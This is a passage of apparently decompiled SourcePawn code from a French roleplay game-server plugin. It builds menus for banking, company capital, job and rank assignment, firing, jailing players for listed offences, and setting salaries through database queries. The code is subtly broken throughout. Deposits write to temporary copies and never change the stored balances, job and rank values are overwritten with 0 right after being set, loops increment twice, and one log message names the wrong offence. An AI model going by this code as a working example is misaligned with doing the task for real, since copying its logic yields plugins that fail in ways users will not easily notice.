		money[param1] = final_cash;
		PrintToChat(param1, "[L-RP] Vous avez retirer %i$.", withdraw_amt);
		decl String:SteamID[64];
		GetClientAuthString(param1, SteamID, 64);
		LogMessage("%N(%s) a retire %i$ de son compte bancaire.", param1, SteamID, withdraw_amt);
	}
	else
	{
		if (action == MenuAction:16)
		{
			CloseHandle(temp_menu_withdraw);
		}
	}
	return 0;
}

public Menu_Capital(Handle:temp_menu_capital, MenuAction:action, param1, param2)
{
	if (action == MenuAction:4)
	{
		decl String:info[32];
		GetMenuItem(temp_menu_capital, param2, info, 32, 0, "", 0);
		if (StrEqual(info, "all", true))
		{
			new var1 = Capital[JobID[param1][0][0]];
			var1 = money[param1][0][0] + var1[0][0];
			PrintToChat(param1, "[L-RP] Vous avez deposer %i$ au capital.  Il y a maintenant %i$ dans votre capital.", money[param1], Capital[JobID[param1][0][0]]);
			decl String:SteamID[64];
			GetClientAuthString(param1, SteamID, 64);
			LogMessage("%N(%s) a depose %i$ dans le capital de son entreprise. JobID: %i", param1, SteamID, money[param1], JobID[param1]);
			money[param1] = 0;
			return 0;
		}
		new deposit_amt = StringToInt(info, 10);
		if (money[param1][0][0] >= deposit_amt)
		{
			new var2 = Capital[JobID[param1][0][0]];
			var2 = var2[0][0] + deposit_amt;
			PrintToChat(param1, "[L-RP] Vous avez deposer %i$.  Vous avez maintenant %i$ dans votre capital.", deposit_amt, Capital[JobID[param1][0][0]]);
			decl String:SteamID[64];
			GetClientAuthString(param1, SteamID, 64);
			LogMessage("%N(%s) a depose %i$ dans le capital de son entreprise. JobID: %i", param1, SteamID, deposit_amt, JobID[param1]);
			new var3 = money[param1];
			var3 = var3[0][0] - deposit_amt;
		}
	}
	else
	{
		if (action == MenuAction:16)
		{
			CloseHandle(temp_menu_capital);
		}
	}
	return 0;
}

Handle:BuildJobMenu()
{
	decl String:name[32];
	decl String:idloop[32];
	new Handle:job = CreateMenu(Menu_Job, MenuAction:28);
	SetMenuTitle(job, "Selectionnez un joueur:");
	new i = 1;
	while (i < MaxClients)
	{
		if (IsClientInGame(i))
		{
			GetClientName(i, name, 32);
			Format(idloop, 32, "%i", i);
			AddMenuItem(job, idloop, name, 0);
			i++;
		}
		i++;
	}
	return job;
}

public Menu_Job(Handle:job, MenuAction:action, param1, param2)
{
	if (action == MenuAction:4)
	{
		decl String:info[32];
		decl String:name[32];
		GetMenuItem(job, param2, info, 32, 0, "", 0);
		identifier = StringToInt(info, 10);
		new var1;
		if (!IsClientInGame(param1))
		{
			return 0;
		}
		GetClientName(identifier, name, 32);
		new Handle:temp_menu_job = CreateMenu(Menu_SetJob, MenuAction:28);
		SetMenuTitle(temp_menu_job, "Choissisez une entreprise pour %s", name);
		AddMenuItem(temp_menu_job, "Aucune", "Aucune", 0);
		AddMenuItem(temp_menu_job, "Gouvernement", "Gouvernement", 0);
		AddMenuItem(temp_menu_job, "Hopital", "Hopital", 0);
		AddMenuItem(temp_menu_job, "Pizzeria", "Pizzeria", 0);
		AddMenuItem(temp_menu_job, "Justice", "Justice", 0);
		AddMenuItem(temp_menu_job, "Tueurs", "Tueurs", 0);
		AddMenuItem(temp_menu_job, "AmmuNation", "Ammu-Nation", 0);
		AddMenuItem(temp_menu_job, "Mafia", "Mafia", 0);
		AddMenuItem(temp_menu_job, "Dealers", "Dealers", 0);
		AddMenuItem(temp_menu_job, "AirControl", "AirControl", 0);
		AddMenuItem(temp_menu_job, "Coachs", "Coachs", 0);
		AddMenuItem(temp_menu_job, "Loto", "Loto", 0);
		AddMenuItem(temp_menu_job, "Banque", "Banque d'Oviscity", 0);
		AddMenuItem(temp_menu_job, "Triade", "Triade", 0);
		AddMenuItem(temp_menu_job, "BulletClub", "BulletClub", 0);
		AddMenuItem(temp_menu_job, "Detectives", "Detectives", 0);
		AddMenuItem(temp_menu_job, "Epiciers", "Epiciers", 0);
		AddMenuItem(temp_menu_job, "Arnaqueurs", "Arnaqueurs", 0);
		AddMenuItem(temp_menu_job, "CarShop", "CarShop", 0);
		AddMenuItem(temp_menu_job, "Boite", "Boite de Nuit", 0);
		if (Functionalitie[2][0] == 1)
		{
			AddMenuItem(temp_menu_job, "Immobilier", "Agence immobiliere", 0);
		}
		DisplayMenu(temp_menu_job, param1, 0);
	}
	else
	{
		if (action == MenuAction:16)
		{
			CloseHandle(job);
		}
	}
	return 0;
}

public Menu_SetJob(Handle:temp_menu_job, MenuAction:action, param1, param2)
{
	if (action == MenuAction:4)
	{
		decl String:info[32];
		GetMenuItem(temp_menu_job, param2, info, 32, 0, "", 0);
		new Handle:temp_menu_rank = CreateMenu(Menu_SetRank, MenuAction:28);
		SetMenuTitle(temp_menu_rank, "Choissisez un poste pour %N", identifier);
		if (StrEqual(info, "Aucune", true))
		{
			CreateTimer(0.1, InitSalary, identifier, 0);
			JobID[identifier] = 0;
			RankID[identifier] = 0;
		}
		else
		{
			if (StrEqual(info, "Gouvernement", true))
			{
				JobID[identifier] = 1;
				AddMenuItem(temp_menu_rank, "1", "Chef d'Etat", 0);
				AddMenuItem(temp_menu_rank, "3", "Agent du C.I.A", 0);
				AddMenuItem(temp_menu_rank, "4", "Agent du F.B.I", 0);
				AddMenuItem(temp_menu_rank, "5", "Policier", 0);
				AddMenuItem(temp_menu_rank, "2", "Gardien", 0);
			}
			if (StrEqual(info, "Hopital", true))
			{
				JobID[identifier] = 2;
				AddMenuItem(temp_menu_rank, "1", "Directeur de l'Hopital", 0);
				AddMenuItem(temp_menu_rank, "3", "Urgentiste", 0);
				AddMenuItem(temp_menu_rank, "4", "Medecin", 0);
				AddMenuItem(temp_menu_rank, "5", "Infirmier", 0);
				AddMenuItem(temp_menu_rank, "2", "Aide-Soignant", 0);
			}
			if (StrEqual(info, "Pizzeria", true))
			{
				JobID[identifier] = 3;
				AddMenuItem(temp_menu_rank, "1", "Chef de la Pizzeria", 0);
				AddMenuItem(temp_menu_rank, "3", "Pizzayolo", 0);
				AddMenuItem(temp_menu_rank, "4", "Serveur", 0);
				AddMenuItem(temp_menu_rank, "5", "Cuisinier", 0);
				AddMenuItem(temp_menu_rank, "2", "Vendeur de Pizza", 0);
			}
			if (StrEqual(info, "Justice", true))
			{
				JobID[identifier] = 4;
				AddMenuItem(temp_menu_rank, "1", "President de la Justice", 0);
				AddMenuItem(temp_menu_rank, "3", "Juge", 0);
				AddMenuItem(temp_menu_rank, "4", "Apprenti Juge", 0);
				AddMenuItem(temp_menu_rank, "5", "Avocat", 0);
				AddMenuItem(temp_menu_rank, "2", "Apprenti Avocat", 0);
			}
			if (StrEqual(info, "Tueurs", true))
			{
				JobID[identifier] = 5;
				AddMenuItem(temp_menu_rank, "1", "Patron des tueurs", 0);
				AddMenuItem(temp_menu_rank, "3", "Tueur d'elite", 0);
				AddMenuItem(temp_menu_rank, "4", "Tueur en Serie", 0);
				AddMenuItem(temp_menu_rank, "5", "Tueur experimente", 0);
				AddMenuItem(temp_menu_rank, "2", "Tueur debutant", 0);
			}
			if (StrEqual(info, "AmmuNation", true))
			{
				JobID[identifier] = 6;
				AddMenuItem(temp_menu_rank, "1", "Directeur de l'Ammu-Nation", 0);
				AddMenuItem(temp_menu_rank, "3", "Armurier", 0);
				AddMenuItem(temp_menu_rank, "4", "Apprenti Armurier", 0);
				AddMenuItem(temp_menu_rank, "5", "Vendeur de Grenades", 0);
				AddMenuItem(temp_menu_rank, "2", "Apprenti Vendeur de Grenades", 0);
			}
			if (StrEqual(info, "Mafia", true))
			{
				JobID[identifier] = 7;
				AddMenuItem(temp_menu_rank, "1", "Parrain", 0);
				AddMenuItem(temp_menu_rank, "3", "Consigliere", 0);
				AddMenuItem(temp_menu_rank, "4", "Caporegime", 0);
				AddMenuItem(temp_menu_rank, "5", "Mafieux", 0);
				AddMenuItem(temp_menu_rank, "2", "Apprenti Mafieux", 0);
			}
			if (StrEqual(info, "Dealers", true))
			{
				JobID[identifier] = 8;
				AddMenuItem(temp_menu_rank, "1", "Chef des Dealers", 0);
				AddMenuItem(temp_menu_rank, "3", "Passeur de Drogue", 0);
				AddMenuItem(temp_menu_rank, "4", "Dealer", 0);
				AddMenuItem(temp_menu_rank, "5", "Apprenti Dealer", 0);
				AddMenuItem(temp_menu_rank, "2", "Revendeur de Drogue", 0);
			}
			if (StrEqual(info, "AirControl", true))
			{
				JobID[identifier] = 9;
				AddMenuItem(temp_menu_rank, "1", "Patron AirControl", 0);
				AddMenuItem(temp_menu_rank, "3", "Ingenieur AirControl", 0);
				AddMenuItem(temp_menu_rank, "4", "Vendeur AirControl", 0);
				AddMenuItem(temp_menu_rank, "5", "Apprenti Vendeur AirControl", 0);
				AddMenuItem(temp_menu_rank, "2", "Vendeur de Recharge AirControl", 0);
			}
			if (StrEqual(info, "Coachs", true))
			{
				JobID[identifier] = 10;
				AddMenuItem(temp_menu_rank, "1", "Patron des Coachs", 0);
				AddMenuItem(temp_menu_rank, "3", "Coachs de Defense", 0);
				AddMenuItem(temp_menu_rank, "4", "Coach Sportif", 0);
				AddMenuItem(temp_menu_rank, "5", "Entraineur", 0);
				AddMenuItem(temp_menu_rank, "2", "Apprenti Entraineur", 0);
			}
			if (StrEqual(info, "Loto", true))
			{
				JobID[identifier] = 11;
				AddMenuItem(temp_menu_rank, "1", "Patron du Loto", 0);
				AddMenuItem(temp_menu_rank, "3", "Huissier du Loto", 0);
				AddMenuItem(temp_menu_rank, "4", "Vendeur de Tickets", 0);
				AddMenuItem(temp_menu_rank, "5", "Apprenti Vendeur de Ticket", 0);
				AddMenuItem(temp_menu_rank, "2", "Buraliste", 0);
			}
			if (StrEqual(info, "Banque", true))
			{
				JobID[identifier] = 12;
				AddMenuItem(temp_menu_rank, "1", "Patron de la Banque", 0);
				AddMenuItem(temp_menu_rank, "3", "Preteur sur Gage", 0);
				AddMenuItem(temp_menu_rank, "4", "Banquier", 0);
				AddMenuItem(temp_menu_rank, "5", "Apprenti Banquier", 0);
				AddMenuItem(temp_menu_rank, "2", "Conseiller Financier", 0);
			}
			if (StrEqual(info, "Triade", true))
			{
				JobID[identifier] = 13;
				AddMenuItem(temp_menu_rank, "1", "Chef de la Triade", 0);
				AddMenuItem(temp_menu_rank, "3", "Bras droit Triade", 0);
				AddMenuItem(temp_menu_rank, "4", "Pirate Informatique", 0);
				AddMenuItem(temp_menu_rank, "5", "Gangsters", 0);
				AddMenuItem(temp_menu_rank, "2", "Apprenti Gangsters", 0);
			}
			if (StrEqual(info, "BulletClub", true))
			{
				JobID[identifier] = 14;
				AddMenuItem(temp_menu_rank, "1", "Patron BulletClub", 0);
				AddMenuItem(temp_menu_rank, "3", "Moniteur de Tir", 0);
				AddMenuItem(temp_menu_rank, "4", "Apprenti Moniteur de Tir", 0);
				AddMenuItem(temp_menu_rank, "5", "Vendeur de Permis d'armes", 0);
				AddMenuItem(temp_menu_rank, "2", "Apprenti Vendeur de Permis d'armes", 0);
			}
			if (StrEqual(info, "Detectives", true))
			{
				JobID[identifier] = 15;
				AddMenuItem(temp_menu_rank, "1", "Chef Detectives", 0);
				AddMenuItem(temp_menu_rank, "3", "Enqueteur", 0);
				AddMenuItem(temp_menu_rank, "4", "Apprenti Enqueteur", 0);
				AddMenuItem(temp_menu_rank, "5", "Detective", 0);
				AddMenuItem(temp_menu_rank, "2", "Apprenti Detective", 0);
			}
			if (StrEqual(info, "Epiciers", true))
			{
				JobID[identifier] = 16;
				AddMenuItem(temp_menu_rank, "1", "Patron de l'epicerie", 0);
				AddMenuItem(temp_menu_rank, "3", "Epicier", 0);
				AddMenuItem(temp_menu_rank, "4", "Apprenti Epicier", 0);
				AddMenuItem(temp_menu_rank, "5", "Vendeur de Glaces", 0);
				AddMenuItem(temp_menu_rank, "2", "Apprenti Vendeur de Glaces", 0);
			}
			if (StrEqual(info, "Arnaqueurs", true))
			{
				JobID[identifier] = 17;
				AddMenuItem(temp_menu_rank, "1", "Chef Arnaqueurs", 0);
				AddMenuItem(temp_menu_rank, "3", "Arnaqueur Professionnel", 0);
				AddMenuItem(temp_menu_rank, "4", "Arnaqueur", 0);
				AddMenuItem(temp_menu_rank, "5", "Apprenti Arnaqueur", 0);
				AddMenuItem(temp_menu_rank, "2", "Bidouilleur", 0);
			}
			if (StrEqual(info, "CarShop", true))
			{
				JobID[identifier] = 18;
				AddMenuItem(temp_menu_rank, "1", "Patron CarShop", 0);
				AddMenuItem(temp_menu_rank, "3", "Vendeur de Voitures", 0);
				AddMenuItem(temp_menu_rank, "4", "Apprenti Vendeur de Voitures", 0);
				AddMenuItem(temp_menu_rank, "5", "Garagiste", 0);
				AddMenuItem(temp_menu_rank, "2", "Apprenti Garagiste", 0);
			}
			if (StrEqual(info, "Boite", true))
			{
				JobID[identifier] = 19;
				AddMenuItem(temp_menu_rank, "1", "Barman", 0);
				AddMenuItem(temp_menu_rank, "3", "Serveur", 0);
				AddMenuItem(temp_menu_rank, "4", "DiscJockey", 0);
				AddMenuItem(temp_menu_rank, "5", "CallGirl", 0);
				AddMenuItem(temp_menu_rank, "2", "Videur", 0);
			}
			if (StrEqual(info, "Immobilier", true))
			{
				JobID[identifier] = 20;
				AddMenuItem(temp_menu_rank, "1", "Directeur de l'agence immobiliere", 0);
				AddMenuItem(temp_menu_rank, "3", "Vendeur immobilier experimente", 0);
				AddMenuItem(temp_menu_rank, "4", "Vendeur immobilier senior", 0);
				AddMenuItem(temp_menu_rank, "5", "Vendeur immobilier", 0);
				AddMenuItem(temp_menu_rank, "2", "Apprenti vendeur immobilier", 0);
			}
			JobID[identifier] = 0;
		}
		DisplayMenu(temp_menu_rank, param1, 0);
	}
	else
	{
		if (action == MenuAction:16)
		{
			CloseHandle(temp_menu_job);
		}
	}
	return 0;
}

public Menu_SetRank(Handle:temp_menu_rank, MenuAction:action, param1, param2)
{
	if (action == MenuAction:4)
	{
		decl String:info[64];
		GetMenuItem(temp_menu_rank, param2, info, 64, 0, "", 0);
		if (StrEqual(info, "1", true))
		{
			RankID[identifier] = 1;
		}
		else
		{
			if (StrEqual(info, "3", true))
			{
				RankID[identifier] = 3;
			}
			if (StrEqual(info, "4", true))
			{
				RankID[identifier] = 4;
			}
			if (StrEqual(info, "5", true))
			{
				RankID[identifier] = 5;
			}
			if (StrEqual(info, "2", true))
			{
				RankID[identifier] = 2;
			}
			RankID[identifier] = 0;
		}
		CreateTimer(0.1, InitSalary, identifier, 0);
		PrintToChat(param1, "[L-RP] Action Effectuee sur le joueur %N.", identifier);
		Save(identifier);
	}
	else
	{
		if (action == MenuAction:16)
		{
			CloseHandle(temp_menu_rank);
		}
	}
	return 0;
}

Handle:BuildVirerMenu(client)
{
	decl String:query[256];
	decl String:error[256];
	new Handle:db = SQL_Connect("Roleplay", true, error, 255);
	Format(query, 255, "SELECT * FROM `RP_Players` WHERE `JOBID` =  %i;", JobID[client]);
	new Handle:job_list = SQL_Query(db, query, -1);
	new Handle:virer = CreateMenu(Menu_Virer, MenuAction:28);
	SetMenuTitle(virer, "Selectionnez un joueur:");
	if (job_list)
	{
		while (SQL_FetchRow(job_list))
		{
			decl String:SteamID[64];
			decl String:name[128];
			decl String:AuthString[64];
			SQL_FetchString(job_list, 0, SteamID, 64, 0);
			SQL_FetchString(job_list, 2, name, 128, 0);
			new DBRankID = SQL_FetchInt(job_list, 6, 0);
			if (GetTime({0,0}) + -259200 >= SQL_FetchInt(job_list, 1, 0))
			{
				Format(name, 128, "%s - Inactif", name);
			}
			GetClientAuthString(client, AuthString, 64);
			if (!StrEqual(AuthString, SteamID, true))
			{
				if (RankID[client][0][0] == 1)
				{
					if (DBRankID != 1)
					{
						AddMenuItem(virer, SteamID, name, 0);
					}
				}
				if (RankID[client][0][0] == 6)
				{
					new var1;
					if (DBRankID != 1)
					{
						AddMenuItem(virer, SteamID, name, 0);
					}
				}
			}
		}
	}
	CloseHandle(job_list);
	CloseHandle(db);
	return virer;
}

public Menu_Virer(Handle:virer, MenuAction:action, param1, param2)
{
	if (action == MenuAction:4)
	{
		decl String:info[32];
		decl String:query[256];
		GetMenuItem(virer, param2, info, 32, 0, "", 0);
		if (!IsClientInGame(param1))
		{
			return 0;
		}
		decl String:error[256];
		new Handle:db = SQL_Connect("Roleplay", true, error, 255);
		Format(query, 255, "UPDATE `RP_Players` SET `JOBID` = 0, `RANKID` = 0 WHERE `STEAMID` = '%s';", info);
		SQL_FastQuery(db, query, -1);
		new client = Client_FindBySteamId(info);
		if (client != -1)
		{
			if (JobID[client][0][0] == 1)
			{
				SwitchTeam(client, 2);
			}
			JobID[client] = 0;
			RankID[client] = 0;
			CreateTimer(0.1, InitSalary, client, 0);
			PrintToChat(param1, "[L-RP] Vous avez virer %N de votre entreprise.", client);
			PrintToChat(client, "[L-RP] Le joueur %N vous a virer de son entreprise.", param1);
		}
		else
		{
			PrintToChat(param1, "[L-RP] Vous avez virer un joueur de votre entreprise.");
		}
		CloseHandle(db);
	}
	else
	{
		if (action == MenuAction:16)
		{
			CloseHandle(virer);
		}
	}
	return 0;
}

Handle:BuildJailMenu(client, Player)
{
	decl String:Buffer[32];
	new Handle:jail_menu = CreateMenu(Menu_Jail, MenuAction:28);
	SetMenuTitle(jail_menu, "Combien de temps doit rester %N ?", Player);
	Format(Buffer, 32, "%i_1", Player);
	AddMenuItem(jail_menu, Buffer, "Annuler la peine / Liberer", 0);
	new var1;
	if (RankID[client][0][0] == 1)
	{
		Format(Buffer, 32, "%i_2", Player);
		AddMenuItem(jail_menu, Buffer, "Garde a vue", 0);
	}
	Format(Buffer, 32, "%i_3", Player);
	AddMenuItem(jail_menu, Buffer, "Meurtre ou tentative de meurtre sur policier", 0);
	Format(Buffer, 32, "%i_4", Player);
	AddMenuItem(jail_menu, Buffer, "Meurtre ou tentative de meurtre sur civil", 0);
	Format(Buffer, 32, "%i_5", Player);
	AddMenuItem(jail_menu, Buffer, "Vol", 0);
	Format(Buffer, 32, "%i_6", Player);
	AddMenuItem(jail_menu, Buffer, "Nuisance sonore", 0);
	Format(Buffer, 32, "%i_7", Player);
	AddMenuItem(jail_menu, Buffer, "Insultes envers les forces de l'ordre", 0);
	Format(Buffer, 32, "%i_8", Player);
	AddMenuItem(jail_menu, Buffer, "Obstruction envers la police", 0);
	Format(Buffer, 32, "%i_9", Player);
	AddMenuItem(jail_menu, Buffer, "Fuite / Refus d'obtemperer", 0);
	Format(Buffer, 32, "%i_10", Player);
	AddMenuItem(jail_menu, Buffer, "Abus +force", 0);
	new var2;
	if (!HasPermisLeger[Player][0][0])
	{
		Format(Buffer, 32, "%i_11", Player);
		AddMenuItem(jail_menu, Buffer, "Possession d'armes illegale", 0);
	}
	if (0 < JailTime[Player][0][0])
	{
		Format(Buffer, 32, "%i_12", Player);
		AddMenuItem(jail_menu, Buffer, "Mutinerie / Evasion", 0);
	}
	Format(Buffer, 32, "%i_13", Player);
	AddMenuItem(jail_menu, Buffer, "Intrusion propriete privee", 0);
	Format(Buffer, 32, "%i_14", Player);
	AddMenuItem(jail_menu, Buffer, "Intrusion poste de police", 0);
	Format(Buffer, 32, "%i_15", Player);
	AddMenuItem(jail_menu, Buffer, "Vol de voitures", 0);
	Format(Buffer, 32, "%i_16", Player);
	AddMenuItem(jail_menu, Buffer, "Degradation de vehicule", 0);
	Format(Buffer, 32, "%i_17", Player);
	AddMenuItem(jail_menu, Buffer, "Conduite dangereuse", 0);
	new var3;
	if (JobID[Player][0][0] == 7)
	{
		Format(Buffer, 32, "%i_18", Player);
		AddMenuItem(jail_menu, Buffer, "Crochettage", 0);
	}
	SetMenuExitButton(jail_menu, false);
	DisplayMenu(jail_menu, client, 0);
	return Handle:0;
}

public Menu_Jail(Handle:jail_menu, MenuAction:action, param1, param2)
{
	if (action == MenuAction:4)
	{
		decl String:info[32];
		new Player = 0;
		new number = 0;
		GetMenuItem(jail_menu, param2, info, 32, 0, "", 0);
		decl String:Buffer[8][32];
		ExplodeString(info, "_", Buffer, 2, 32, false);
		Player = StringToInt(Buffer[0][Buffer], 10);
		number = StringToInt(Buffer[1], 10);
		if (IsValidEntity(Player))
		{
			decl String:SteamId[64];
			decl String:CopSteamID[64];
			GetClientAuthString(Player, SteamId, 64);
			GetClientAuthString(param1, CopSteamID, 64);
			if (number == 1)
			{
				FreePlayer(Player);
				PrintToChat(param1, "[L-RP] Vous avez liberer %N.", Player);
				LogMessage("%N a liberer %N.", param1, Player);
			}
			if (number == 2)
			{
				SetEntityMoveType(Player, MoveType:2);
				SetEntityRenderColor(Player, 255, 255, 255, 255);
				IsCrochette[Player] = 0;
				Client_RemoveAllWeapons(Player, "", false);
				GivePlayerItem(Player, "weapon_knife", 0);
				JailTime[Player] = 360;
				PrintToChat(param1, "[L-RP] Vous avez emprisonner %N pendant 6H pour une Garde a Vue.", Player);
				PrintToChat(Player, "[L-RP] Vous avez ete emprisonner 6H par %N pour une Garde a Vue.", param1);
				LogMessage("%N a emprisonner %N pour une Garde a Vue.", param1, Player);
			}
			if (number == 3)
			{
				Jail(Player, param1, 720, 1000);
				PrintToChat(param1, "[L-RP] Vous avez emprisonner %N pendant 12H pour Meurtre ou tentative de meurtre sur policier.", Player);
				PrintToChat(Player, "[L-RP] Vous avez ete emprisonner 12H par %N pour Meurtre ou tentative de meurtre sur policier.", param1);
				LogMessage("%N a emprisonner %N pour Meurtre ou tentative de meurtre sur policier.", param1, Player);
			}
			if (number == 4)
			{
				Jail(Player, param1, 480, 500);
				PrintToChat(param1, "[L-RP] Vous avez emprisonner %N pendant 8H pour Meurtre ou tentative de meurtre sur civil.", Player);
				PrintToChat(Player, "[L-RP] Vous avez ete emprisonner 8H par %N pour Meurtre ou tentative de meurtre sur civil.", param1);
				LogMessage("%N a emprisonner %N pour Meurtre ou tentative de meurtre sur civil.", param1, Player);
			}
			if (number == 5)
			{
				Jail(Player, param1, 240, 100);
				PrintToChat(param1, "[L-RP] Vous avez emprisonner %N pendant 4H pour Vol.", Player);
				PrintToChat(Player, "[L-RP] Vous avez ete emprisonner 4H par %N pour Vol.", param1);
				LogMessage("%N a emprisonner %N pour Vol.", param1, Player);
			}
			if (number == 6)
			{
				Jail(Player, param1, 240, 100);
				PrintToChat(param1, "[L-RP] Vous avez emprisonner %N pendant 4H pour Nuissance Sonore.", Player);
				PrintToChat(Player, "[L-RP] Vous avez ete emprisonner 4H par %N pour Nuissance Sonore.", param1);
				LogMessage("%N a emprisonner %N pour Nuissance Sonore.", param1, Player);
			}
			if (number == 7)
			{
				Jail(Player, param1, 360, 100);
				PrintToChat(param1, "[L-RP] Vous avez emprisonner %N pendant 6H pour Insultes.", Player);
				PrintToChat(Player, "[L-RP] Vous avez ete emprisonner 6H par %N pour Insultes.", param1);
				LogMessage("%N a emprisonner %N pour Insultes envers les forces de l'ordre.", param1, Player);
			}
			if (number == 8)
			{
				Jail(Player, param1, 240, 100);
				PrintToChat(param1, "[L-RP] Vous avez emprisonner %N pendant 4H pour Obstruction envers la police.", Player);
				PrintToChat(Player, "[L-RP] Vous avez ete emprisonner 4H par %N pour Obstruction envers la police.", param1);
				LogMessage("%N a emprisonner %N pour Obstruction envers la police.", param1, Player);
			}
			if (number == 9)
			{
				Jail(Player, param1, 360, 250);
				PrintToChat(param1, "[L-RP] Vous avez emprisonner %N pendant 6H pour Fuite / Refus d'obtemperer.", Player);
				PrintToChat(Player, "[L-RP] Vous avez ete emprisonner 6H par %N pour Fuite / Refus d'obtemperer.", param1);
				LogMessage("%N a emprisonner %N pour Fuite / Refus d'obtemperer.", param1, Player);
			}
			if (number == 10)
			{
				Jail(Player, param1, 240, 100);
				PrintToChat(param1, "[L-RP] Vous avez emprisonner %N pendant 4H pour Abus +force.", Player);
				PrintToChat(Player, "[L-RP] Vous avez ete emprisonner 4H par %N pour Abus +force.", param1);
				LogMessage("%N a emprisonner %N pour Abus +force.", param1, Player);
			}
			if (number == 11)
			{
				Jail(Player, param1, 240, 800);
				PrintToChat(param1, "[L-RP] Vous avez emprisonner %N pendant 6H pour Possession d'armes illegale.", Player);
				PrintToChat(Player, "[L-RP] Vous avez ete emprisonner 6H par %N pour Possession d'armes illegale.", param1);
				LogMessage("%N a emprisonner %N pour Possession d'armes illegale.", param1, Player);
			}
			if (number == 12)
			{
				Jail(Player, param1, 360, 150);
				PrintToChat(param1, "[L-RP] Vous avez emprisonner %N pendant 6H pour Mutinerie / Evasion.", Player);
				PrintToChat(Player, "[L-RP] Vous avez ete emprisonner 6H par %N pour Mutinerie / Evasion.", param1);
				LogMessage("%N a emprisonner %N pour Mutinerie / Evasion.", param1, Player);
			}
			if (number == 13)
			{
				Jail(Player, param1, 240, 100);
				PrintToChat(param1, "[L-RP] Vous avez emprisonner %N pendant 4H pour Intrusion propriete privee.", Player);
				PrintToChat(Player, "[L-RP] Vous avez ete emprisonner 4H par %N pour Intrusion propriete privee.", param1);
				LogMessage("%N a emprisonner %N pour Intrusion propriete privee.", param1, Player);
			}
			if (number == 14)
			{
				Jail(Player, param1, 360, 200);
				PrintToChat(param1, "[L-RP] Vous avez emprisonner %N pendant 6H pour Intrusion poste de police.", Player);
				PrintToChat(Player, "[L-RP] Vous avez ete emprisonner 6H par %N pour Intrusion poste de police.", param1);
				LogMessage("%N a emprisonner %N pour Intrusion poste de police.", param1, Player);
			}
			if (number == 15)
			{
				Jail(Player, param1, 240, 100);
				PrintToChat(param1, "[L-RP] Vous avez emprisonner %N pendant 4H pour Vol de Voitures.", Player);
				PrintToChat(Player, "[L-RP] Vous avez ete emprisonner 4H par %N pour Vol de Voitures.", param1);
				LogMessage("%N a emprisonner %N pour Tir dans la Rue.", param1, Player);
			}
			if (number == 16)
			{
				Jail(Player, param1, 360, 100);
				PrintToChat(param1, "[L-RP] Vous avez emprisonner %N pendant 6H pour Degradation de Vehicule.", Player);
				PrintToChat(Player, "[L-RP] Vous avez ete emprisonner 6H par %N pour Degradation de Vehicule.", param1);
				LogMessage("%N a emprisonner %N pour Degradation de Vehicule.", param1, Player);
			}
			if (number == 17)
			{
				Jail(Player, param1, 240, 100);
				PrintToChat(param1, "[L-RP] Vous avez emprisonner %N pendant 4H pour Conduite Dangereuse.", Player);
				PrintToChat(Player, "[L-RP] Vous avez ete emprisonner 4H par %N pour Conduite Dangereuse.", param1);
				LogMessage("%N a emprisonner %N pour Conduite Dangereuse.", param1, Player);
			}
			if (number == 18)
			{
				Jail(Player, param1, 360, 100);
				PrintToChat(param1, "[L-RP] Vous avez emprisonner %N pendant 6H pour Crochettage.", Player);
				PrintToChat(Player, "[L-RP] Vous avez ete emprisonner 6H par %N pour Crochettage.", param1);
				LogMessage("%N a emprisonner %N pour Crochettage.", param1, Player);
			}
		}
	}
	else
	{
		if (action == MenuAction:16)
		{
			CloseHandle(jail_menu);
		}
	}
	return 0;
}

Handle:BuildSalaireMenu(client)
{
	decl String:RName[32];
	decl String:info[12];
	new Handle:salaire = CreateMenu(Menu_Salaire, MenuAction:28);
	SetMenuTitle(salaire, "Selectionnez un poste:");
	new i = 1;
	while (i <= 5)
	{
		GetRankName(JobID[client][0][0], i, RName, 32);
		IntToString(i, info, 10);
		AddMenuItem(salaire, info, RName, 0);
		i++;
	}
	DisplayMenu(salaire, client, 0);
	return Handle:0;
}

public Menu_Salaire(Handle:salaire, MenuAction:action, param1, param2)
{
	if (action == MenuAction:4)
	{
		decl String:info[32];
		decl String:query[256];
		decl DBSalary;
		GetMenuItem(salaire, param2, info, 32, 0, "", 0);
		RID[JobID[param1][0][0]] = StringToInt(info, 10);
		if (!IsClientInGame(param1))
		{
			return 0;
		}
		new Handle:choice = CreateMenu(Menu_Choice, MenuAction:28);
		decl String:error[256];
		new Handle:db = SQL_Connect("Roleplay", true, error, 255);
		Format(query, 255, "SELECT `SALARY` FROM `RP_Jobs` WHERE `JOBID` =  %i AND `RANKID` =  %i;", JobID[param1], RID[JobID[param1][0][0]]);
		new Handle:salary_list = SQL_Query(db, query, -1);
		if (salary_list)
		{
			while (SQL_FetchRow(salary_list))
			{
				DBSalary = SQL_FetchInt(salary_list, 0, 0);
				SetMenuTitle(choice, "Selectionnez un salaire(Salaire actuel: %i$):", DBSalary);
			}
		}
		CloseHandle(salary_list);
		CloseHandle(db);
		AddMenuItem(choice, "0", "0$", 0);
		AddMenuItem(choice, "50", "50$", 0);
		AddMenuItem(choice, "100", "100$", 0);
		AddMenuItem(choice, "150", "150$", 0);
		AddMenuItem(choice, "200", "200$", 0);
		AddMenuItem(choice, "250", "250$", 0);
		AddMenuItem(choice, "300", "300$", 0);
		AddMenuItem(choice, "350", "350$", 0);
		AddMenuItem(choice, "400", "400$", 0);
		AddMenuItem(choice, "450", "450$", 0);
		AddMenuItem(choice, "500", "500$", 0);
		DisplayMenu(choice, param1, 0);
	}
	else
	{
		if (action == MenuAction:16)
		{
			CloseHandle(salaire);
		}
	}
	return 0;
}

public Menu_Choice(Handle:choice, MenuAction:action, param1, param2)
{
	if (action == MenuAction:4)
	{
		decl String:info[32];
		decl String:query[256];
		GetMenuItem(choice, param2, info, 32, 0, "", 0);
		new salary2 = StringToInt(info, 10);
		if (!IsClientInGame(param1))
		{
			return 0;
		}
		decl String:error[256];
		new Handle:db = SQL_Connect("Roleplay", true, error, 255);
		Format(query, 255, "UPDATE `RP_Jobs` SET `SALARY` = %i WHERE `JOBID` = %i AND `RANKID` = %i;", salary2, JobID[param1], RID[JobID[param1][0][0]]);
		SQL_FastQuery(db, query, -1);
		CloseHandle(db);
		new i = 1;
		while (i < MaxClients)
		{
			new var1;
			if (JobID[param1][0][0] == JobID[i][0][0])
			{
				Salary[i] = salary2;
				i++;
			}
			i++;
		}
		decl String:RName[32];
		GetRankName(JobID[param1][0][0], RID[JobID[param1][0][0]][0][0], RName, 32);
		PrintToChat(param1, "[L-RP] Les %ss recevront maintenant %i$ de salaire.", RName, salary2);
